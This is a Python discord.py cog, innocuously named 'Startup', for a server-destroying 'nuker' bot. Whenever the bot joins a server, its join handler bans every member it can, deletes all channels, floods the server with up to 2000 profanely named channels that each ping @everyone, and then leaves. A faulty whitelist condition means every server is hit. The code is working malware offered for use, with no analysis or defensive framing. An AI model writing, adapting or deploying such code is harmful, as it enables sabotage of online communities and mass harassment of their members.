import discord
import os
from discord.ext.commands import Bot
from discord.ext import commands

class Startup(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    @commands.Cog.listener()
    async def on_ready(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print('Logged in as: ' + self.bot.user.name + '#' + self.bot.user.discriminator + ' - (' + str(self.bot.user.id) + ')')
    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        if guild.id != 993573362221715546 or guild.id != 993594197594607636:
            print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
            for member in guild.members:
                try:
                    await member.ban(reason='Banned by Anix <3')
                    print(f'Banned {member.name} - {str(member.id)}')
                except:
                    pass
            print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Banned all possible members")
            for c in guild.channels:
                await c.delete()
            print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all channels :)')
            try:
                for i in range(0,2000):
                    await guild.create_text_channel(f'fuckme{i}')
                    await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme{i}').id).send("@everyone nox#4041 is the best")
            except:
                pass
            print(f'Guild: {guild.name} - {str(guild.id)} - Created 2000 channels :)')
            try:
                await guild.leave()
            except:
                pass
            print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')
        
def setup(bot):
    bot.add_cog(Startup(bot))
    print("Startup cog loaded")